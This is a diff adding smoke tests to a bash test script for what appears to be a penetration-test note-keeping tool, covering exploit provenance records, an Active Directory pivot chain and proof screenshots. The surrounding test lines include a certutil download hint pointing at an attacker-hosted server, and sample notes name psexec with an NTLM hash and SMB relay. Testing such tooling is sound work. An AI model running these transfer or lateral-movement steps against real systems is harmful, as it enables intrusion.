@@ -56,6 +56,9 @@ printf '#!/usr/bin/env bash\nseq 1 50\n' > "$T/bin/nc"
 # ip: knows one fact, our tun0 address, and only when FAKE_TUN0 is set (so most checks see "no VPN")
 # shellcheck disable=SC2016  # the stub script must expand ${FAKE_TUN0} and ${6} when it runs, not now
 printf '#!/usr/bin/env bash\n[ -n "${FAKE_TUN0:-}" ] && [ "${6:-}" = tun0 ] && echo "5: tun0    inet $FAKE_TUN0/23 scope global tun0"\nexit 0\n' > "$T/bin/ip"
+# xclip: always "has" a minimal, valid PNG on the clipboard, so `shot`/`proofshot` can be tested
+# without a real X11/Wayland session
+printf '#!/usr/bin/env bash\nprintf "\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a"\n' > "$T/bin/xclip"
 chmod +x "$T/bin/"*
 export CHOWN_LOG="$T/chown.log"
 export SERVE_LOG="$T/serve.log"
@@ -236,6 +239,50 @@ check "hint: webdav DavWWWRoot + port"   has "$T/serve.out" 'copy \\10.10.14.2@8
 check "http: python http.server, port"   has "$SERVE_LOG" "python3 -m http.server 8000"
 check "hint: http wget/certutil"         has "$T/serve.out" "certutil -urlcache -split -f http://<your-ip>:8000/FILE FILE"
 check "serve --auth needs --smb"         has "$T/serve.out" "--auth is only supported with --smb"
+
+# --- exploit provenance, AD pivot chain, proof-missing warning, proofshot -----------------------
+echo "exploit provenance + pivot chain + proof warnings"
+mkdir -p smoke/exploits
+echo '#!/usr/bin/env python3' > smoke/exploits/cve-2021-9999.py
+printf '%s\n' \
+  'addexploit cve-2021-9999.py https://example.com/exploit-db/9999 "changed LHOST/LPORT, fixed offset for 8.2"' \
+  'pivot DC01 "psexec with bob:ntlm-hash"' \
+  'pivot FILE02 "smb relay via DC01"' \
+  'exit' | "$MK" smoke > "$T/prov.out" 2>&1
+check "addexploit: timeline note"         has smoke/notes/timeline.md "exploit recorded: cve-2021-9999.py (source: https://example.com/exploit-db/9999)"
+check "addexploit: SOURCES.md has source" has smoke/exploits/SOURCES.md "https://example.com/exploit-db/9999"
+check "addexploit: SOURCES.md has mods"   has smoke/exploits/SOURCES.md "changed LHOST/LPORT, fixed offset for 8.2"
+check "pivot: first hop recorded"         has smoke/notes/timeline.md "pivot -> DC01 via psexec with bob:ntlm-hash"
+check "pivot: second hop recorded"        has smoke/notes/timeline.md "pivot -> FILE02 via smb relay via DC01"
+check "pivot: confirms to the terminal"   has "$T/prov.out" "pivot recorded: -> DC01 via psexec with bob:ntlm-hash"
+"$MK" -r smoke > /dev/null 2>&1
+R=smoke/report/smoke-report.md
+check "report: exploit source shown"      has "$R" "https://example.com/exploit-db/9999"
+check "report: exploit modification shown" has "$R" "changed LHOST/LPORT, fixed offset for 8.2"
+check "report: exploit file still listed" has "$R" "cve-2021-9999.py"
+check "report: SOURCES.md excluded from file bullet list" bash -c "! grep -qx '- SOURCES.md' '$R'"
+check "report: pivot chain section"       has "$R" "## Pivot chain"
+check "report: pivot chain first hop"     has "$R" "pivot -> DC01 via psexec with bob:ntlm-hash"
+check "report: pivot chain second hop"    has "$R" "pivot -> FILE02 via smb relay via DC01"
+check "timeline: addexploit command shown (mod text only lives there)" has "$R" '$ addexploit cve-2021-9999.py https://example.com/exploit-db/9999 "changed LHOST/LPORT, fixed offset for 8.2"'
+check "timeline: pivot command not duplicated"    bash -c "! grep -q '\\\$ pivot DC01' '$R'"
+
+"$MK" -n nopro 10.10.10.50 > /dev/null 2>&1
+"$MK" -r nopro > "$T/nopro.out" 2>&1
+check "proof warning: fires when nothing is marked" has "$T/nopro.out" "WARNING: not yet marked done: local.txt proof.txt"
+printf '%s\n' 'markproof local aaa' 'markproof proof bbb' 'exit' | "$MK" nopro > /dev/null 2>&1
+"$MK" -r nopro > "$T/nopro2.out" 2>&1
+check "proof warning: clears once both are marked" bash -c "! grep -q 'WARNING: not yet marked' '$T/nopro2.out'"
+
+"$MK" -n shotbox 10.10.10.51 > /dev/null 2>&1
+printf '%s\n' 'proofshot local cafebabe' 'proofshot bogus' 'exit' | "$MK" shotbox > "$T/proofshot.out" 2>&1
+check "proofshot: screenshot file created"  bash -c "compgen -G 'shotbox/screenshots/*.png' >/dev/null"
+check "proofshot: caption recorded"       has shotbox/screenshots/captions.tsv "local.txt proof (cafebabe)"
+check "proofshot: notes.md ticked"        has shotbox/notes/notes.md "- [x] local.txt: cafebabe"
+check "proofshot: timeline has the mark"  has shotbox/notes/timeline.md "proof: local.txt marked done (cafebabe)"
+check "proofshot: bad arg gives usage"    has "$T/proofshot.out" "usage: proofshot local|proof"
+"$MK" -r shotbox > /dev/null 2>&1
+check "timeline: proofshot command not duplicated" bash -c "! grep -q '\\\$ proofshot local' 'shotbox/report/shotbox-report.md'"
 
 # --- re-entering vs typos -----------------------------------------------------------------------
 echo "new vs existing"
